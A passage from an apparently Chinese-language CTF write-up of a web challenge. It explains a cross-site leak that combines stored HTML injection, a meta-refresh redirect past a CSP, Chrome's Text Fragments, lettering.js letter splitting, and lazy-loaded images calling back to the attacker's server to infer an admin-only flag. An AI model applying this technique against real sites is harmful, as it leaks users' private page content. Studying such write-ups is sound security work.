href="https://github.com/gorhill/uBlock/wiki/Filter-syntax-extensions" target="_blank" rel="noopener">extends</a> the syntax and is designed to work with custom rules and filters. Furthermore, advanced mode allows uBlock Origin to work in <a href="https://github.com/gorhill/uBlock/wiki/Dynamic-filtering:-default-deny" target="_blank" rel="noopener">default-deny mode</a>, which mode will cause <a href="https://requestpolicycontinued.github.io/#what-are-cross-site-requests" target="_blank" rel="noopener">all 3rd-party network requests</a> to be blocked by default, unless allowed by the user.</p></blockquote><p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;uBlock &#x662F;&#x4E00;&#x4E2A;&#x901A;&#x7528;&#x7684; blocker &#xFF0C;&#x901A;&#x8FC7;&#x5404;&#x79CD;&#x81EA;&#x5B9A;&#x4E49;&#x89C4;&#x5219;&#x6765;&#x914D;&#x5408;&#x8FC7;&#x6EE4;&#x9875;&#x9762;&#x5143;&#x7D20;&#xFF0C;&#x66F4;&#x591A;&#x7684;&#x53EF;&#x4EE5;&#x5230; <a href="https://github.com/gorhill/uBlock" target="_blank" rel="noopener">uBlock</a> &#x4ED3;&#x5E93;&#x67E5;&#x770B;&#x3002;</p><p><del>&#x4E2A;&#x4EBA;&#x4E5F;&#x5E76;&#x6CA1;&#x6709;&#x975E;&#x5E38;&#x7406;&#x89E3;&#x4F5C;&#x8005;&#x5728;&#x6B64;&#x5904;&#x5F15;&#x5165; uBlock &#x7684;&#x70B9;&#xFF0C;&#x4EE5;&#x53CA;&#x914D;&#x5408; User Activation &#x7684;&#x51FA;&#x9898;&#x610F;&#x56FE;&#xFF0C;&#x867D;&#x7136;&#x4F5C;&#x8005;&#x89E3;&#x91CA;&#x4E86;&#x4ED6;&#x7684;&#x51FA;&#x9898;&#x610F;&#x56FE;</del>&#xFF1A;</p><blockquote><p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.  Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again.    </p></blockquote><p>&#x5C31;&#x5728;&#x6211;&#x5199;&#x8FD9;&#x6BB5;&#x8BDD;&#x7684;&#x65F6;&#x5019;&#x6211;&#x5E61;&#x7136;&#x9192;&#x609F;&#xFF0C;&#x8FD9;&#x4E2A; uBlock &#x7684;&#x5F15;&#x5165;&#x5BF9;&#x4F20;&#x9012; User Activation &#x6781;&#x4E3A;&#x91CD;&#x8981;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x8FD9;&#x4E48;&#x8BF4;&#x5462;&#xFF1F;&#x56E0;&#x4E3A;&#x5B83;&#x5BF9;&#x4E8E;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x91CC;&#x8981;&#x5F15;&#x5165;&#x7684;&#x4E00;&#x4E2A;&#x6982;&#x5FF5;&#x6709;&#x7740;&#x5341;&#x5206;&#x91CD;&#x8981;&#x7684;&#x8054;&#x7CFB;&#xFF01;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x6682;&#x4E14;&#x6211;&#x4EEC;&#x628A; uBlock + User Activation &#x7684;&#x6982;&#x5FF5;&#x4EE5;&#x53CA;&#x5229;&#x7528;&#x653E;&#x4E00;&#x653E;&#xFF0C;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x6765;&#x770B;&#x770B;&#x600E;&#x4E48;&#x83B7;&#x53D6; flag &#x3002;</p><h3 id="How-to-get-the-FLAG"><a href="#How-to-get-the-FLAG" class="headerlink" title="How to get the FLAG"></a>How to get the FLAG</h3><ol><li>&#x5B58;&#x5728; CSP &#x9650;&#x5236;</li><li>Admin &#x4F1A;&#x70B9;&#x51FB;&#x6211;&#x4EEC;&#x7684; issue &#x94FE;&#x63A5;</li><li>Flag &#x5728;&#x540C;&#x57DF;&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#xFF1A;<a href="http://catalog.pwni.ng/issue.php?id=3" target="_blank" rel="noopener">http://catalog.pwni.ng/issue.php?id=3</a></li></ol><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7531; 1) &#x77E5;&#x9053;&#xFF0C;&#x4E00;&#x4E9B;&#x5229;&#x7528; scirpt &#x7684;&#x8DF3;&#x8F6C;&#x5C31;&#x5931;&#x6548;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5982;&#x4E0B;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x9875;&#x9762;&#x8DF3;&#x8F6C;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://url/&apos;&quot;</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x662F;&#x4E24;&#x4E2A; HTML &#x6CE8;&#x5165;&#xFF0C;&#x800C;&#x4E14; image url &#x5904;&#x7684;&#x6CE8;&#x5165;&#x8FD8;&#x662F;&#x5B58;&#x50A8;&#x578B;&#x7684;&#x3002;</p><p>&#x5047;&#x8BBE;&#x5982;&#x679C;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x6267;&#x884C; script &#x4EE3;&#x7801;&#x7684;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E24;&#x4E2A; iframe &#xFF0C;&#x4E00;&#x4E2A; iframe &#x6307;&#x5411;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x7684; js &#x9875;&#x9762;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x4E2A; iframe &#x6307;&#x5411; flag &#x7684;&#x9875;&#x9762;&#xFF0C;&#x901A;&#x8FC7; js &#x6765;&#x83B7;&#x53D6;&#x540C;&#x57DF;&#x4E0B;&#x7684;&#x53E6;&#x4E00;&#x4E2A; iframe &#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x8FD9;&#x4E5F;&#x7B97;&#x662F;&#x5E38;&#x7528;&#x7684; csrf &#x7684;&#x4E00;&#x79CD;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003; Byte Bandits CTF 2020 - Notes App &#x7684;&#x89E3;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x518D;&#x8D58;&#x8FF0;&#x4E86;&#x3002;</p><p>&#x5982;&#x679C;&#x80FD;&#x63D2;&#x5165; script &#x6267;&#x884C;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x53EF;&#x60DC;&#x63D2;&#x4E0D;&#x5F97;&#x3002;</p><h3 id="Text-Fragments"><a href="#Text-Fragments" class="headerlink" title="Text Fragments"></a>Text Fragments</h3><p>&#x53CD;&#x624B;&#x770B;&#x4E00;&#x624B; Chrome &#x65B0;&#x7279;&#x6027;&#xFF0C;&#x95F7;&#x58F0;&#x53D1;&#x5927;&#x8D22;&#x3002;</p><p>&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;CTF &#x51FA;&#x9898;&#x4EBA;&#x4F1A;&#x6709;&#x4E8B;&#x6CA1;&#x4E8B;&#x53BB;&#x770B;&#x770B; php &#x6E90;&#x7801; or chrome new features &#xFF0C;&#x6240;&#x4EE5;&#xFF1A;<a href="https://developers.google.com/web/updates/2020/02/nic80#more" target="_blank" rel="noopener">New in Chrome 80</a></p><blockquote><p>Of course, there&#x2019;s plenty more!</p><ul><li>You can now link directly to text fragments on a page, by using <code>#:~:text=something</code>. Chrome will scroll to and highlight the first instance of that text fragment. For example [<a href="https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York]" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York]</a>(<a href="https://en.wikipedia.org/wiki/Rickrolling#:~:text=New" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rickrolling#:~:text=New</a> York)</li></ul></blockquote><p>Scroll To Text Fragment: <a href="https://chromestatus.com/feature/4733392803332096" target="_blank" rel="noopener">https://chromestatus.com/feature/4733392803332096</a></p><blockquote><p>&#x200B;    This feature allows a user or author to link to a specific portion of a page, using a text snippet provided in the URL. When the page is loaded, the browser highlights the text and scrolls it into view.</p></blockquote><p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;Chrome &#x5728;&#x4ECA;&#x5E74;2&#x6708;&#x4EFD;&#x7684;&#x66F4;&#x65B0;&#x63A8;&#x51FA;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7279;&#x6027;&#xFF0C;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x80FD;&#x8BA9;&#x6211;&#x4EEC;&#x7528;&#x5F62;&#x5982;<code>#:~:text=something</code>&#x7684;&#x6837;&#x5F0F;&#x6765;&#x6ED1;&#x52A8;&#x5230;&#x8BE5;&#x9875;&#x9762;<code>something</code>&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x9AD8;&#x4EAE;&#xFF0C;&#x8D4B;&#x4E88;&#x4E86;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x4F3C;&#x4E00;&#x4E2A; anchor &#x951A;&#x6807;&#x7B7E;&#x7684;&#x4F5C;&#x7528;&#x3002;</p><p>&#x5177;&#x4F53;&#x7684;&#x4F7F;&#x7528;&#x5E08;&#x5085;&#x4EEC;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x6587;&#x6863; <a href="https://wicg.github.io/ScrollToTextFragment/" target="_blank" rel="noopener">Text Fragments</a> &#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x53EA;&#x62E9;&#x53D6;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;&#x6765;&#x8BF4;&#xFF1A;</p><ul><li><p>&#x5339;&#x914D;&#x6A21;&#x5F0F;&#xFF1A;</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#:~:text=[prefix-,]textStart[,textEnd][,-suffix]</span></span><br><span class="line">          context  |<span class="hljs-string">-------match-----</span>|<span class="hljs-string">  context</span></span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x524D;&#x7F00;&#x8DDF;&#x8DDF;&#x540E;&#x7F00;&#x53EA;&#x662F;&#x4E3A;&#x4E86;&#x9650;&#x5236;&#x4E0A;&#x4E0B;&#x6587;&#xFF0C;&#x771F;&#x6B63;&#x5339;&#x914D;&#x7684;&#x8FD8;&#x662F;&#x4E2D;&#x95F4;&#x7684; textStart &amp; textEnd</p></li><li><p>&#x9700;&#x8981;&#x5B8C;&#x6574;&#x5339;&#x914D;&#x4E00;&#x4E2A;&#x5355;&#x8BCD;&#xFF0C;&#x65E0;&#x6CD5;&#x5339;&#x914D;&#x5355;&#x8BCD;&#x4E2D;&#x7684;&#x5355;&#x4E2A;&#x5B57;&#x6BCD;&#x3002;</p><blockquote><p>Example 12</p><p>&#x201C;range&#x201D; will match in &#x201C;mountain range&#x201D; but not in &#x201C;color orange&#x201D; nor &#x201C;forest ranger&#x201D;.</p></blockquote></li><li><p>&#x5355;&#x8BCD;&#x9700;&#x8981;&#x5728;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x5757;&#x91CC;&#x9762;&#xFF1A;</p><blockquote><p>Example 11</p><p></p><figure class="highlight asciidoc hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">:~:text=The</span> quick,lazy dog</span><br></pre></td></tr></tbody></table></figure><p></p><p>will fail to match in</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>The<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>quick brown fox<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>jumped over the lazy dog<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>because the starting string &#x201C;The quick&#x201D; does not appear within a single, uninterrupted block. The instance of &#x201C;The quick&#x201D; in the document has a block element between &#x201C;The&#x201D; and &#x201C;quick&#x201D;.</p><p>It does, however, match in this example:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>The quick brown fox<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>jumped over the lazy dog<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote></li></ul><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6709;&#x4E2A;&#x60F3;&#x6CD5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x65B0;&#x7279;&#x6027;&#x53BB;&#x5339;&#x914D;&#x5230; flag &#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x95EE;&#x9898;&#x6765;&#x4E86;&#xFF1A;</p><ul><li>&#x5982;&#x679C; flag &#x662F; PCTF{TEST} &#xFF0C;&#x6211;&#x4EEC;&#x7528;<code>#:~:text=P-,C,T,-F</code>&#x662F;&#x5339;&#x914D;&#x4E0D;&#x5230;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4E0D;&#x80FD;&#x5339;&#x914D;&#x5230;&#x5355;&#x8BCD;&#x7684;&#x5355;&#x4E2A;&#x5B57;&#x6BCD;</li><li>&#x5373;&#x4F7F;&#x6211;&#x4EEC;&#x80FD;&#x5339;&#x914D;&#x5230;&#x4E86;&#xFF0C;&#x600E;&#x4E48;&#x6837;&#x5224;&#x65AD;&#x6211;&#x4EEC;&#x5339;&#x914D;&#x5230;&#x4E86;&#x5462;&#xFF1F;</li></ul><h3 id="Lettering"><a href="#Lettering" class="headerlink" title="Lettering"></a>Lettering</h3><p>&#x6309;&#x7167;&#x4E0A;&#x8FF0;&#x601D;&#x8DEF;&#xFF0C;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x5F97;&#x627E;&#x4E2A;&#x529E;&#x6CD5;&#x62C6;&#x5206;&#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5176;&#x5B9E;&#x51FA;&#x9898;&#x4EBA;&#x5DF2;&#x7ECF;&#x5F88;&#x8D34;&#x5FC3;&#x5730;&#x4E3A;&#x6211;&#x4EEC;&#x505A;&#x597D;&#x4E86;&#xFF1A;</p><p>&#x8FD9;&#x662F;&#x9875;&#x9762;&#x6240;&#x5F15;&#x5165;&#x7684;&#x6587;&#x4EF6;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/lettering.js/0.7.0/jquery.lettering.min.js&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://www.google.com/recaptcha/api.js?render=6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/main.js&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;&#x5F15;&#x5165;&#x4E86; jquery.lettering.min.js &#xFF0C;&#x5E76;&#x4E14; main.js &#x6709;&#x5982;&#x4E0B;&#x4EE3;&#x7801;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="hljs-string">&quot;em&quot;</span>).lettering();</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728; lettering.js &#x7684;&#x6587;&#x6863;&#x4E2D;&#x770B;&#x5230; <a href="https://github.com/davatron5000/Lettering.js/wiki/Wrapping-letters-with-lettering()" target="_blank" rel="noopener">Lettering.js wiki - Wrapping letters with lettering()</a></p><blockquote><p>We&#x2019;ll start with some really basic markup:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fancy_title&quot;</span>&gt;</span>Some Title<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>After including jQuery, <a href="http://github.com/davatron5000/Lettering.js/downloads" target="_blank" rel="noopener">download and include the latest minified version of Lettering.js</a>, then a script block with the magical <code>.lettering()</code> method:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;path/to/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;path/to/jquery.lettering.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">$(<span class="hljs-built_in">document</span>).ready(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-javascript">  $(<span class="hljs-string">&quot;.fancy_title&quot;</span>).lettering();</span></span><br><span class="line">});</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>The resulting code will churn your <code>.fancy_title</code> and output the following:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fancy_title&quot;</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char1&quot;</span>&gt;</span>S<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char2&quot;</span>&gt;</span>o<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char3&quot;</span>&gt;</span>m<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char4&quot;</span>&gt;</span>e<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char5&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char6&quot;</span>&gt;</span>T<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char7&quot;</span>&gt;</span>i<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char8&quot;</span>&gt;</span>t<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char9&quot;</span>&gt;</span>l<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char10&quot;</span>&gt;</span>e<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5728;&#x9875;&#x9762;&#x52A0;&#x5165;&#x4E00;&#x4E2A;<code>&lt;em&gt;</code>&#x6807;&#x7B7E;&#xFF0C;&#x5373;&#x53EF;&#x628A;&#x5185;&#x5BB9;&#x62C6;&#x5206;&#x4E3A;&#x5355;&#x4E2A;&#x5B57;&#x6BCD;&#xFF0C;&#x6548;&#x679C;&#x5982;&#x4E0B;&#xFF1A;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424182529.png" alt></p><p>&#x6240;&#x4EE5;&#x8FD9;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>#:~:text=P-,C,T,-F</code>&#x8FDB;&#x884C;&#x9009;&#x4E2D;&#x4E86;&#x3002;</p><h3 id="Spark-Thinking"><a href="#Spark-Thinking" class="headerlink" title="Spark Thinking"></a>Spark Thinking</h3><p>&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x5224;&#x65AD;&#x6211;&#x4EEC;&#x662F;&#x5426;&#x9009;&#x4E2D;&#x4E86;&#x5462;&#xFF1F;</p><p>&#x8FD9;&#x91CC; Exp &#x4F5C;&#x8005;&#x5F88;&#x806A;&#x660E;&#x5730;&#x60F3;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x529E;&#x6CD5;&#xFF1A;</p><ul><li>&#x5229;&#x7528;&#x6211;&#x4EEC;&#x5728; information &#x6BB5;&#x63D0;&#x5230;&#x7684;&#x540C;&#x4E00; session &#x4F1A;&#x5B58;&#x50A8;&#x4E00;&#x5B9A;&#x7684; HTML &#x5143;&#x7D20;&#xFF0C;&#x6240;&#x4EE5;&#x5373;&#x4F7F;&#x767B;&#x5F55;&#x72B6;&#x6001;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528; fetch no-cors &#x6765;&#x66F4;&#x65B0;&#x754C;&#x9762;&#xFF0C;&#x5229;&#x7528;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x540C;&#x4E00; session &#x7684;&#x754C;&#x9762;&#x5F97;&#x5230;&#x65E0;&#x8FC7;&#x6EE4;&#x7684; HTML &#x6CE8;&#x5165;</li><li>&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684; HTML &#x6CE8;&#x5165;&#x521B;&#x9020;&#x5224;&#x65AD;&#x6761;&#x4EF6;&#xFF1A;&#x6CE8;&#x5165;&#x8DB3;&#x591F;&#x591A;&#x7684;<code>&lt;br&gt;</code>&#x6807;&#x7B7E;&#xFF0C;&#x8BA9; FLAG &#x4F4D;&#x4E8E;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x9875;&#x9762;&#x4E4B;&#x5916;&#xFF0C;&#x5E76;&#x5728;<code>&lt;br&gt;</code>&#x7684;&#x6700;&#x540E;&#x52A0;&#x5165;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#xFF0C;&#x5229;&#x7528;&#x56FE;&#x7247;&#x61D2;&#x52A0;&#x8F7D;&#x6765;&#x786E;&#x5B9A; Text Fragments &#x662F;&#x5426;&#x5339;&#x914D;&#x5230;&#x4E86; FLAG</li><li>&#x4E00;&#x5F00;&#x59CB;&#x56E0;&#x4E3A;&#x56FE;&#x7247;&#x88AB;&#x653E;&#x7F6E;&#x5230;&#x4E86;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x4E4B;&#x5916;&#x5E76;&#x4E14;&#x7531;&#x4E8E;&#x56FE;&#x7247;&#x61D2;&#x52A0;&#x8F7D;&#xFF0C;&#x56FE;&#x7247;&#x5E76;&#x4E0D;&#x4F1A;&#x8BF7;&#x6C42;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x8FD9;&#x65F6;&#x5982;&#x679C;<code>#:~:text=P-,C,T,-F</code>&#x5339;&#x914D;&#x5230;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x6CE8;&#x5165;&#x7684;<code>&lt;br&gt;</code>&#x6807;&#x7B7E;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x9875;&#x9762;&#x4F1A;&#x5148;&#x8FDB;&#x884C;&#x6EDA;&#x52A8;&#x5230; FLAG &#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#xFF0C;&#x56FE;&#x7247;&#x624D;&#x4F1A;&#x52A0;&#x8F7D;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x56FE;&#x7247;&#x61D2;&#x52A0;&#x8F7D;&#x6765;&#x786E;&#x5B9A;&#x5339;&#x914D;&#x6210;&#x529F;&#xFF1B;&#x5982;&#x679C;&#x5339;&#x914D;&#x4E0D;&#x6210;&#x529F;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x4E0D;&#x4F1A;&#x8BF7;&#x6C42;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;</li><li>&#x6240;&#x4EE5;&#x8FD9;&#x65F6;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5229;&#x7528;&#x81EA;&#x5DF1;&#x7684; vps &#x76D1;&#x542C;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#x8BA9;&#x61D2;&#x52A0;&#x8F7D;&#x7684;&#x56FE;&#x7247;&#x5728;&#x89E6;&#x53D1;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x8BF7;&#x6C42;&#x6211;&#x4EEC;&#x7684; vps &#x5C31;&#x53EF;&#x4EE5;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5339;&#x914D;&#x6210;&#x529F;&#x4E86;</li></ul><blockquote class="colorquote 